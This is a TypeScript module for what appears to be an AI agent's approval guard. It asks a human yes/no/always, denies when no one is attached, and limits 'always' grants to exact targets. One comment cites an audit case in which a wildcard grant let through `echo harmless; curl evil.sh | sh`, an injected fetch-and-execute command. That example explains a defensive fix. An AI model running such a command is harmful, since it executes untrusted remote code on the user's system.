/**
 * approval.ts — the human side of the guard.
 *
 * The runtime asks a yes/no question; this module renders it, reads exactly one
 * line from the same chat bar and answers. Sessions with no human attached fail
 * closed: an ask nobody can answer is a denial, never a silent allow.
 */

import type { ApprovalHandler, ApprovalRequest, GuardAction, GuardKind, Lease, Runtime } from "../contracts";
import * as core from "../core";
import { SESSION_LEASE_TTL_MS } from "../core/loop";
import type { KernelClient } from "../core/kernel";
import { createRenderer, type Renderer } from "./render";
import { bold, cyan, dim, errorMessage, sanitizeText, truncate, yellow } from "./style";

type RuntimeWithExtras = Runtime & {
  /** Optional: remember an approval decision as a lease for this session. */
  grantLease?: (kind: string, pattern: string, ttlMs?: number) => unknown;
};

export interface ApprovalUi {
  /** True when a human is attached and can answer. */
  interactive: boolean;
  /** Reads one line from the chat bar; replaced by the running UI. */
  ask: (question: string) => Promise<string>;
  /** Where notices go; replaced by the running UI's renderer. */
  renderer: Renderer;
  /** The runtime this UI is talking to right now (swapped by /new). */
  runtime?: Runtime;
}

/** Build the mutable hand-off between main.ts, the chat loop and the guard. */
export function createApprovalUi(interactive: boolean): ApprovalUi {
  return {
    interactive: Boolean(interactive),
    // Safe default: until a UI attaches, nobody can answer, so deny.
    ask: async () => "",
    renderer: createRenderer({ wrap: false }),
    runtime: undefined,
  };
}

/** How long an "always" answer lasts, in the same minutes the lease is minted for. */
function leaseMinutes(): number {
  return Math.max(1, Math.round(SESSION_LEASE_TTL_MS / 60_000));
}

/**
 * Remember an "always" for this session, scoped to the approved TARGET: an
 * "always" for `npm run dev` in the workspace must not become authority over
 * every shell command anywhere for the next TTL (the confirmed defect was a
 * kind-wide pattern "*"). Only kind and target are known here, so the exact
 * target is the grant — a target that was already a directory-scoped pattern
 * keeps that scope verbatim, never broadened.
 *
 * The GRANT is minted through the kernel client with the session id when both
 * are available, so owner scoping applies: a subagent child's checks carry the
 * child's session id and re-enter approval (docs/09 R-tools-32). A runtime that
 * exposes only grantLease() falls back to the legacy owner-less shape (globally
 * consultable — documented in kernel.ts); no target at all means there is
 * nothing narrower than everything to grant, so the answer stays "this time".
 * Ruling 32: the minted object is a grant, not a lease — it authorises a fresh
 * one-use lease per covered effect (a lease would be spent by its first use).
 */
async function rememberAlways(
  ui: ApprovalUi,
  kind: string,
  target: string,
  ctx: { kernel?: KernelClient; sessionId?: string },
  r: Renderer,
): Promise<boolean> {
  if (target === "" || kind === "other") return false;
  // The lease language reads a trailing `*` as a PREFIX wildcard
  // (guard.rs::pattern_matches, kernel.ts::patternMatches). A command or path
  // whose own text ends in `*` — the shell command `echo *`, a literal file
  // named `out*` — therefore cannot be expressed as an exact pattern: minting
  // it would silently widen the grant to everything with that prefix (the
  // audit's `echo *` grant covered `echo harmless; curl evil.sh | sh`). No
  // exact target, no remembered grant: the answer stays "this time".
  if (target.endsWith("*")) return false;
  try {
    if (ctx.kernel !== undefined && typeof ctx.sessionId === "string" && ctx.sessionId !== "") {
      // Ruling 32: "always" mints a session GRANT — a bounded pre-authorisation
      // that mints a fresh one-use lease per effect it covers (a lease would be
      // spent by its first use, turning "always" into "once").
      await ctx.kernel.makeGrant(kind as GuardKind, target, SESSION_LEASE_TTL_MS, ctx.sessionId);
      return true;
    }
    const runtime = ui.runtime as RuntimeWithExtras | undefined;
    const grant = runtime?.grantLease;
    if (typeof grant !== "function") return false;
    await Promise.resolve(grant.call(runtime, kind, target));
    return true;
  } catch (err) {
    r.notice(`could not remember that decision: ${errorMessage(err)}`);
    return false;
  }
}

/** The handler registered with the core runtime. */
export function createApprovalHandler(ui: ApprovalUi): ApprovalHandler {
  // The gate calls this with the action and the kernel client when it has them
  // (see loop.ts ApprovalWithContext); both are optional so a plain
  // `handler(req)` caller keeps working.
  const handler = async (
    req: ApprovalRequest,
    action?: GuardAction,
    kernel?: KernelClient,
    gateSessionId?: string,
  ): Promise<boolean> => {
    const kind = sanitizeText(req?.kind ?? "other") || "other";
    const title = sanitizeText(req?.title) || "this action";
    const detail = sanitizeText(req?.detail ?? "").replace(/\s+/g, " ").trim();
    const r = ui.renderer;

    if (!ui.interactive) {
      r.notice(`approval requested (${kind}): ${title} \u2014 denied, no one is attached to say yes`);
      return false;
    }

    r.ensureLineStart();
    r.write("\n" + yellow("\u26a0") + " " + bold("Approve " + title + "?") + (detail ? " " + detail : "") + "\n");

    let answer = "";
    try {
      answer = await ui.ask(dim(" [y]es / [n]o / [a]lways ") + bold(cyan("\u276f ")));
    } catch {
      answer = "";
    }
    const choice = String(answer ?? "").trim().toLowerCase();

    if (choice === "a" || choice === "always") {
      // Grant the target the guard asked about, not the kind: the pattern must
      // match the same string the guard checks against, so it is the raw target.
      const target = typeof action?.target === "string" ? action.target : "";
      const grantKind = typeof action?.kind === "string" ? action.kind : kind;
      // The gate names the session the check speaks for; a runtime that exposes
      // its own sessionId is the fallback for plain `handler(req)` callers.
      const sessionId =
        typeof gateSessionId === "string" && gateSessionId !== ""
          ? gateSessionId
          : typeof ui.runtime?.sessionId === "string"
            ? ui.runtime.sessionId
            : undefined;
      const remembered = await rememberAlways(ui, grantKind, target, { kernel, sessionId }, r);
      if (remembered) {
        r.notice(
          `approved, and ${grantKind} is allowed for ${sanitizeText(target) || target} in this session for ${leaseMinutes()} minutes`,
        );
      } else {
        r.notice("approved (this time)");
      }
      return true;
    }
    if (choice === "y" || choice === "yes") {
      r.notice("approved (this time)");
      return true;
    }
    if (choice === "n" || choice === "no") {
      r.notice("denied");
      return false;
    }

    r.notice(choice === "" ? "no answer \u2014 denied" : `did not understand "${truncate(choice, 24)}" \u2014 denied`);
    return false;
  };
  return handler as ApprovalHandler;
}

type CoreExtra = {
  setApprovalHandler?: (handler: ApprovalHandler) => void;
  default?: { setApprovalHandler?: (handler: ApprovalHandler) => void };
};

/**
 * Hand the approval handler to the core runtime. Returns false when this core
 * build does not expose the hook yet — the chat keeps working, asks simply fail
 * closed instead of hanging.
 */
export function installApprovalHandler(ui: ApprovalUi): boolean {
  const mod = core as unknown as CoreExtra;
  const fn = typeof mod?.setApprovalHandler === "function" ? mod.setApprovalHandler : mod?.default?.setApprovalHandler;
  if (typeof fn !== "function") return false;
  try {
    fn(createApprovalHandler(ui));
    return true;
  } catch {
    return false;
  }
}
